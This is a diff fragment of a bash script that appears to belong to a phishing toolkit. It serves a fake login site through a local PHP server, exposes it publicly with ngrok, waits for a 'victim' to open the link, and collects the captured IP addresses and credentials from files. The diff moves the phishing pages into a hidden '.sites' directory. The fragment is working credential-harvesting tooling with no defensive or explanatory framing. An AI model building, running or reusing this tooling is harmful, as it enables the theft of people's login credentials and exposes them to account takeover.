@@ -1025,7 +1025,7 @@ fi
 fi
 
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
-cd sites/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 &
+cd .sites/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 &
 sleep 2
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
 ./ngrok http 3333 > /dev/null 2>&1 &
@@ -1049,16 +1049,16 @@ printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting victim open the link ctrl 
 while [ true ]; do
 
 
-if [[ -e "sites/$server/ip.txt" ]]; then
+if [[ -e ".sites/$server/ip.txt" ]]; then
 printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
 catch_ip
-rm -rf sites/$server/ip.txt
+rm -rf .sites/$server/ip.txt
 fi
 sleep 0.5
-if [[ -e "sites/$server/usernames.txt" ]]; then
+if [[ -e ".sites/$server/usernames.txt" ]]; then
 printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
 catch_cred
-rm -rf sites/$server/usernames.txt
+rm -rf .sites/$server/usernames.txt
 fi
 sleep 0.5
 done
